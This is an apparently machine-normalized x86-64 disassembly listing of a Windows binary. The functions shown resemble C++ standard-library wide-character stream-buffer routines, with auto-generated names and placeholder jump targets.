mov [ rsp + rcx + 0x50 ] rax
mov rax [ rsp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x50 ] rax
lea rcx [ rsp + 0x68 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rsp + 0x68 ] rax
mov [ rbp - 0x28 ] r14
mov [ rbp - 0x20 ] r14d
mov rdx rsi
lea rcx [ rsp + 0x60 ]
call sub_140004ed0
lea rdx [ rbp + 0x50 ]
lea rcx [ rsp + 0x50 ]
call sub_140003da0
nop
mov rdx rax
mov rcx r13
call sub_140001cf0
nop
cmp [ rbp + 0x68 ] 0x8
jb r-xdata
mov edx [ rbp - 0x8 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x18 ]
call sub_140003120
nop
lea rcx [ rbp - 0x18 ]
call sub_140003cd0
mov [ rbp - 0x18 ] r15
lea rcx [ rbp - 0x18 ]
call sub_140037d08
mov rcx [ rbp + 0x50 ]
call j_sub_14003ad04
nop
sub_140003850
mov [ rsp + 0x20 ] rbx
push rsi
sub rsp 0x20
mov rbx [ rcx + 0x68 ]
lea rax [ r--data ]
mov rsi rcx
mov [ rcx ] rax
test rbx rbx
je r-xdata
lea rcx [ rsi + 0x8 ]
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rsi
jmp sub_1400382dc
mov [ rsp + 0x40 ] rdi
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_14003ad04
mov rdi [ rsp + 0x40 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rbp
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebp ebp
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbp
cmove rbp rdi
call sub_14003828c
test rbp rbp
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rax [ rbp ]
mov edx 0x1
mov rcx rbp
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_140003910
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
call [ rax + 0x30 ]
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov rax [ rbx + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
add rsp 0x20
pop rbx
retn
movzx eax cx
add rsp 0x20
pop rbx
retn
sub_140003950
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
xor ebp ebp
mov rdi r8
mov rsi rdx
mov r12 rcx
test r8 r8
jle r-xdata
mov rax rbp
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x50 ] r14
mov r14d 0xffff
mov [ rsp + 0x40 ] rbx
mov rax [ r12 ]
mov rcx r12
call [ rax + 0x38 ]
cmp r14w ax
je r-xdata
mov rdx [ r12 + 0x40 ]
cmp rdi rax
mov rcx rsi
mov rdx [ rdx ]
cmovl r13 rdi
lea rbx [ r13 + r13 ]
mov r8 rbx
call sub_14003a8c0
mov rax [ r12 + 0x58 ]
add rsi rbx
sub [ rax ] r13d
mov rcx [ r12 + 0x40 ]
movsxd rax r13d
add rax rax
add rbp r13
sub rdi r13
add [ rcx ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov r13 [ rsp + 0x48 ]
mov r14 [ rsp + 0x50 ]
mov rax rbp
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov [ rsi ] ax
add rsi 0x2
inc rbp
dec rdi
test rdi rdi
jg r-xdata
mov rcx r12
call sub_140010fd0
mov r13 rax
test rax rax
jle r-xdata
sub_140003a30
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
mov r13 rcx
test r8 r8
jle r-xdata
mov rax rsi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
retn
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x50 ] r14
mov r14d 0xffff
mov [ rsp + 0x40 ] rbx
mov r8 [ r13 ]
movzx edx [ rbp ]
mov rcx r13
call [ r8 + 0x18 ]
cmp r14w ax
je r-xdata
mov rcx [ r13 + 0x48 ]
cmp rdi rax
mov rdx rbp
mov rcx [ rcx ]
cmovl r12 rdi
lea rbx [ r12 + r12 ]
mov r8 rbx
call sub_14003a8c0
mov rax [ r13 + 0x60 ]
add rbp rbx
sub [ rax ] r12d
mov rcx [ r13 + 0x48 ]
movsxd rax r12d
add rax rax
add rsi r12
sub rdi r12
add [ rcx ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov r14 [ rsp + 0x50 ]
mov rax rsi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop rdi
pop rsi
retn
add rbp 0x2
inc rsi
dec rdi
test rdi rdi
jg r-xdata
mov rcx r13
call sub_140004720
mov r12 rax
test rax rax
jle r-xdata
sub_140003b30
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400020d0
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_140001dd0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400020d0
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
sub_140003c20
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
lea rax [ r--data ]
mov [ rcx + 0x98 ] rax
mov [ rsp + 0x48 ] 0x1
lea rdx [ rcx + 0x18 ]
call sub_140004740
nop
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
lea rcx [ rdi + 0x18 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rdi + 0x18 ] rax
mov [ rdi + 0x88 ] 0x0
mov [ rdi + 0x90 ] 0x0
mov rax rdi
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_140003cd0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx - 0x98 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x98 ] rax
lea rbx [ rcx - 0x80 ]
lea rax [ r--data ]
mov [ rbx ] rax
test [ rbx + 0x78 ] 0x1
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov [ rbx + 0x70 ] rcx
and [ rbx + 0x78 ] 0xfffffffe
mov rcx rbx
call sub_140003850
nop
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
mov rax [ rbx - 0x8 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x8 ] rax
mov rax [ rbx - 0x18 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rbx - 0x18 ] rax
add rsp 0x30
pop rbx
retn
mov rax [ rbx + 0x20 ]
mov rcx [ rax ]
call j_sub_14003ad04
sub_140003dd0
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x8 ] rax
mov rax [ rcx - 0x18 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x18 ] rax
retn
sub_140003e10
push rbx
push r12
sub rsp 0x28
test [ rcx + 0x78 ] 0x8
movzx r12d dx
mov rbx rcx
je r-xdata
mov r10d 0xffff
mov [ rsp + 0x40 ] rbp
cmp r10w r12w
jne r-xdata
mov r10 [ rcx + 0x48 ]
mov r8 [ r10 ]
test r8 r8
je r-xdata
mov rdx [ rbx + 0x48 ]
mov r9 [ rdx ]
test r9 r9
je r-xdata
xor ebp ebp
movzx eax bp
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
mov r9 [ rcx + 0x70 ]
cmp r8 r9
jae r-xdata
test [ rbx + 0x78 ] 0x2
je r-xdata
mov r8 [ rbx + 0x60 ]
movsxd rax [ r8 ]
lea rcx [ r9 + rax * 2 ]
cmp r9 rcx
jae r-xdata
mov rax [ rcx + 0x60 ]
movsxd rcx [ rax ]
mov [ r10 ] r9
mov rax [ rbx + 0x60 ]
lea rdx [ r8 + rcx * 2 ]
sub rdx r9
sar rdx 0x1
mov [ rax ] edx
xor ebp ebp
mov [ rsp + 0x50 ] rdi
test r9 r9
jne r-xdata
movzx eax r10w
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
dec [ r8 ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r12w
movzx eax r12w
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
mov rax [ rbx + 0x60 ]
movsxd rdi [ rax ]
mov rax [ rbx + 0x20 ]
add rdi rdi
sub rdi [ rax ]
add rdi r9
sar rdi 0x1
mov edi ebp
jmp r-xdata
test rax rax
je r-xdata
mov eax 0x20
jmp r-xdata
mov rax rdi
shr rax 0x1
cmp rax 0x20
jae r-xdata
movzx eax r10w
mov rdi [ rsp + 0x50 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x28
pop r12
pop rbx
retn
nop
mov ecx 0x7fffffff
sub rcx rax
cmp rcx rdi
jae r-xdata
test rax rax
jne r-xdata
shr rax 0x1
jne r-xdata
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x58 ] r13
mov [ rsp + 0x20 ] r14
lea r14 [ rax + rdi ]
mov rcx r14
call sub_140002750
mov rcx [ rbx + 0x20 ]
mov r13 [ rcx ]
mov rsi rax
test rdi rdi
je r-xdata
mov rax [ rbx + 0x28 ]
mov [ rbx + 0x70 ] rsi
lea rcx [ r14 + r14 ]
mov [ rax ] rsi
mov rax [ rbx + 0x48 ]
sar rcx 0x1
mov [ rax ] rsi
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
mov rax [ rbx + 0x20 ]
test [ rbx + 0x78 ] 0x4
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
je r-xdata
lea r8 [ rdi + rdi ]
mov rdx r13
mov rcx rax
call sub_14003a8c0
test rdi rdi
jne r-xdata
mov [ rax ] rsi
mov rax [ rbx + 0x58 ]
mov [ rax ] 0x1
jmp r-xdata
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
sar rsi 0x1
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x70 ]
sub rax r13
sar rax 0x1
lea rax [ rsi + rax * 2 ]
mov [ rbx + 0x70 ] rax
mov rax [ rbx + 0x48 ]
mov rcx [ rax ]
sub rcx r13
sar rcx 0x1
lea rdx [ rsi + rcx * 2 ]
mov rcx [ rbx + 0x28 ]
mov rax [ rcx ]
sub rax r13
sar rax 0x1
lea rax [ rsi + rax * 2 ]
mov [ rcx ] rax
mov rax [ rbx + 0x48 ]
lea rcx [ r14 + r14 ]
sub rcx rdx
mov [ rax ] rdx
mov rax [ rbx + 0x60 ]
add rcx rsi
sar rcx 0x1
mov [ rax ] ecx
test [ rbx + 0x78 ] 0x4
je r-xdata
test [ rbx + 0x78 ] 0x1
mov r14 [ rsp + 0x20 ]
mov rsi [ rsp + 0x48 ]
je r-xdata
mov rax [ rbx + 0x48 ]
mov r8 [ rax ]
mov rax [ rbx + 0x40 ]
mov rcx [ rax ]
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sub rcx r13
sar rcx 0x1
lea rdx [ rsi + rcx * 2 ]
sub r8 rdx
mov [ rax ] rdx
mov rax [ rbx + 0x58 ]
add r8 0x2
sar r8 0x1
mov [ rax ] r8d
mov rax [ rbx + 0x20 ]
mov [ rax ] rsi
mov rax [ rbx + 0x40 ]
sar rsi 0x1
mov [ rax ] rbp
mov rax [ rbx + 0x58 ]
mov [ rax ] esi
jmp r-xdata
mov rax [ rbx + 0x60 ]
or [ rbx + 0x78 ] 0x1
mov r13 [ rsp + 0x58 ]
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov rdx [ rcx ]
mov rbp [ rsp + 0x40 ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r12w
movzx eax r12w
add rsp 0x28
pop r12
pop rbx
retn
mov rcx r13
call j_sub_14003ad04
sub_1400040d0
mov rax [ rcx + 0x40 ]
mov r9d 0xffff
mov r8 [ rax ]
test r8 r8
je r-xdata
movzx eax r9w
retn
mov rax [ rcx + 0x20 ]
cmp r8 [ rax ]
jbe r-xdata
cmp r9w dx
je r-xdata
mov rax [ rcx + 0x58 ]
inc [ rax ]
mov rax [ rcx + 0x40 ]
add [ rax ] 0xfffffffffffffffe
cmp r9w dx
je r-xdata
cmp dx [ r8 - 0x2 ]
je r-xdata
xor eax eax
retn
mov rax [ rcx + 0x40 ]
mov rcx [ rax ]
movzx eax dx
mov [ rcx ] dx
retn
test [ rcx + 0x78 ] 0x2
jne r-xdata
sub_140004130
sub rsp 0x8
mov r11 [ rcx + 0x40 ]
mov r9 rcx
mov r10 [ r11 ]
test r10 r10
jne r-xdata
mov [ rsp ] rbx
mov rbx [ rcx + 0x58 ]
movsxd rcx [ rbx ]
lea rdx [ r10 + rcx * 2 ]
cmp r10 rdx
jae r-xdata
mov eax 0xffff
add rsp 0x8
retn
test [ r9 + 0x78 ] 0x4
jne r-xdata
movzx eax [ r10 ]
mov rbx [ rsp ]
add rsp 0x8
retn
mov eax 0xffff
mov rbx [ rsp ]
add rsp 0x8
retn
mov rax [ r9 + 0x48 ]
mov rcx [ rax ]
test rcx rcx
je r-xdata
cmp rcx r10
ja r-xdata
cmp [ r9 + 0x70 ] rcx
jae r-xdata
cmp [ r9 + 0x70 ] r10
jbe r-xdata
mov rax [ r9 + 0x70 ]
sub rax [ r11 ]
sar rax 0x1
mov [ rbx ] eax
mov rax [ r9 + 0x40 ]
mov rbx [ rsp ]
mov rcx [ rax ]
movzx eax [ rcx ]
add rsp 0x8
retn
mov [ r9 + 0x70 ] rcx
sub_1400041d0
push rbx
mov r10 r8
mov r8 [ rcx + 0x48 ]
mov rbx rdx
mov rax [ r8 ]
mov r11 rcx
test rax rax
je r-xdata
mov edx [ rsp + 0x30 ]
mov [ rsp + 0x10 ] rdi
test dl 0x1
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
test dl 0x2
je r-xdata
mov rax [ rcx + 0x40 ]
mov rdi [ rax ]
test rdi rdi
je r-xdata
mov [ rcx + 0x70 ] rax
test r10 r10
cmovne r10 [ r--data ]
mov r8 [ r8 ]
test r8 r8
je r-xdata
mov r8 [ r--data ]
cmp r9d 0x2
jne r-xdata
mov rdi [ r--data ]
cmp r9d 0x2
jne r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
cmp r9d 0x1
jne r-xdata
mov rax [ rcx + 0x20 ]
mov rcx [ rcx + 0x70 ]
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
test r9d r9d
je r-xdata
test dl 0x2
jne r-xdata
test r10 r10
js r-xdata
test r9d r9d
cmovne r10 rdi
mov rax [ rcx + 0x20 ]
mov rcx r8
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
test r10 r10
js r-xdata
mov r10 r8
mov rax [ rcx + 0x20 ]
mov rcx rdi
sub rcx [ rax ]
sar rcx 0x1
add r10 rcx
jmp r-xdata
mov r10 r8
jmp r-xdata
mov rax [ r11 + 0x20 ]
mov r9 [ rax ]
mov rax [ r11 + 0x70 ]
sub rax r9
sar rax 0x1
cmp r10 rax
jg r-xdata
mov r10 rdi
jmp r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rdi [ rsp + 0x10 ]
xor eax eax
mov [ rbx ] r10
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] eax
mov rax rbx
pop rbx
retn
mov rax [ r11 + 0x58 ]
sub r9 rdi
sar r9 0x1
add r9d r10d
sub [ rax ] r9d
mov rcx [ r11 + 0x40 ]
movsxd rax r9d
add rax rax
add [ rcx ] rax
test dl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
jmp r-xdata
mov r9 [ r11 + 0x48 ]
mov r8 [ r9 ]
test r8 r8
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ r9 ] rdx
mov rax [ r11 + 0x60 ]
lea r8 [ r8 + rcx * 2 ]
sub r8 rdx
sar r8 0x1
mov [ rax ] r8d
jmp r-xdata
sub_140004390
mov [ rsp + 0x8 ] rbx
movsxd r10 [ r8 + 0x8 ]
mov ebx r9d
mov r9 rdx
mov rdx [ rcx + 0x48 ]
add r10 [ r8 ]
mov r11 rcx
mov rax [ rdx ]
test rax rax
je r-xdata
mov rcx [ r--data ]
cmp r10 rcx
je r-xdata
cmp [ rcx + 0x70 ] rax
jae r-xdata
mov rbx [ rsp + 0x8 ]
xor eax eax
mov [ r9 ] r10
mov [ r9 + 0x8 ] rax
mov [ r9 + 0x10 ] eax
mov rax r9
retn
test bl 0x1
je r-xdata
mov [ rcx + 0x70 ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x40 ]
mov r8 [ rax ]
test r8 r8
je r-xdata
mov r10 rcx
mov r8 [ rdx ]
test r8 r8
je r-xdata
test r10 r10
js r-xdata
test r10 r10
js r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x20 ]
mov rdx [ rax ]
mov rax [ r11 + 0x70 ]
sub rax rdx
sar rax 0x1
cmp r10 rax
jg r-xdata
mov rax [ r11 + 0x58 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x40 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
test bl 0x2
je r-xdata
mov rax [ r11 + 0x60 ]
sub rdx r8
sar rdx 0x1
add edx r10d
sub [ rax ] edx
mov rcx [ r11 + 0x48 ]
movsxd rax edx
add rax rax
add [ rcx ] rax
jmp r-xdata
mov rbx [ r11 + 0x48 ]
mov r8 [ rbx ]
test r8 r8
je r-xdata
mov rax [ r11 + 0x40 ]
mov rdx [ rax ]
mov rax [ r11 + 0x60 ]
movsxd rcx [ rax ]
mov [ rbx ] rdx
mov rax [ r11 + 0x60 ]
lea r8 [ r8 + rcx * 2 ]
sub r8 rdx
sar r8 0x1
mov [ rax ] r8d
jmp r-xdata
sub_1400044c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x8 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x8 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x8 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140004520
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x10 ]
lea rax [ r--data ]
mov ebx edx
mov r8 [ rdi ]
lea rcx [ rdi + 0x10 ]
movsxd r9 [ r8 + 0x4 ]
mov [ r9 + rcx - 0x10 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140004580
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_140003850
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_1400045b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rsi [ rcx - 0x98 ]
mov edi edx
lea rcx [ rsi + 0x98 ]
call sub_140003cd0
lea rax [ r--data ]
lea rcx [ rsi + 0x98 ]
mov [ rsi + 0x98 ] rax
call sub_140037d08
test dil 0x1
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rsi
call j_sub_14003ad04
sub_140004610
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rcx - 0x18 ]
mov ebx edx
mov rax [ rdi ]
lea rcx [ rdi + 0x18 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x18 ] rax
mov rax [ rcx - 0x8 ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx - 0x8 ] rax
mov rdx [ rcx - 0x18 ]
lea rax [ r--data ]
movsxd r8 [ rdx + 0x4 ]
mov [ r8 + rcx - 0x18 ] rax
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037d08
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140004690
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rcx + 0x78 ] 0x1
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
mov rax [ rbx + 0x20 ]
xor ecx ecx
mov [ rax ] rcx
mov rax [ rbx + 0x40 ]
mov [ rax ] rcx
mov rax [ rbx + 0x58 ]
mov [ rax ] ecx
mov rax [ rbx + 0x28 ]
mov [ rax ] rcx
mov rax [ rbx + 0x48 ]
mov [ rax ] rcx
mov rax [ rbx + 0x60 ]
mov [ rax ] ecx
and [ rbx + 0x78 ] 0xfffffffe
mov [ rbx + 0x70 ] rcx
mov rcx rbx
call sub_140003850
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x20 ]
mov rcx [ rcx ]
call j_sub_14003ad04
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_140004740
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
lea rax [ r--data ]
mov [ r8 + rcx ] rax
mov [ rcx + 0x8 ] 0x0
mov rax [ rcx ]
movsxd rsi [ rax + 0x4 ]
add rsi rcx
mov rcx rsi
call sub_140003290
mov [ rsi + 0x48 ] rbx
mov [ rsi + 0x50 ] 0x0
mov dl 0x20
mov rcx rsi
call sub_140004ce0
mov [ rsi + 0x58 ] ax
cmp [ rsi + 0x48 ] 0x0
jne r-xdata
mov rax [ rdi + 0x10 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi + 0x10 ] rax
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdi ] rax
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov edx [ rsi + 0x10 ]
or edx 0x4
xor r8d r8d
mov rcx rsi
call sub_140003120
nop
sub_140004810
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rdx
mov rdx rcx
xor esi esi
mov [ rbp - 0x40 ] esi
mov eax [ rcx + 0x78 ]
test al 0x2
jne r-xdata
test al 0x4
jne r-xdata
mov rcx [ rcx + 0x48 ]
cmp [ rcx ] rsi
je r-xdata
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov r8 [ rdx + 0x40 ]
cmp [ r8 ] rsi
je r-xdata
mov rax [ rcx ]
mov r8 [ rdx + 0x70 ]
cmp r8 rax
cmovb r8 rax
mov rax [ rdx + 0x28 ]
mov rdx [ rax ]
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
sub r8 rdx
sar r8 0x1
lea rcx [ rbp - 0x30 ]
call sub_140001ea0
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rdx + 0x58 ]
movsxd rcx [ rax ]
mov rax [ r8 ]
lea r8 [ rax + rcx * 2 ]
mov rax [ rdx + 0x20 ]
mov rdx [ rax ]
mov edi 0x7
mov [ rbp - 0x18 ] rdi
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
sub r8 rdx
sar r8 0x1
lea rcx [ rbp - 0x30 ]
call sub_140001ea0
nop
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x90 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rdi 0x8
jb r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rsi
mov r8 [ rbp - 0x20 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_14003a8c0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
mov rcx [ rbp - 0x18 ]
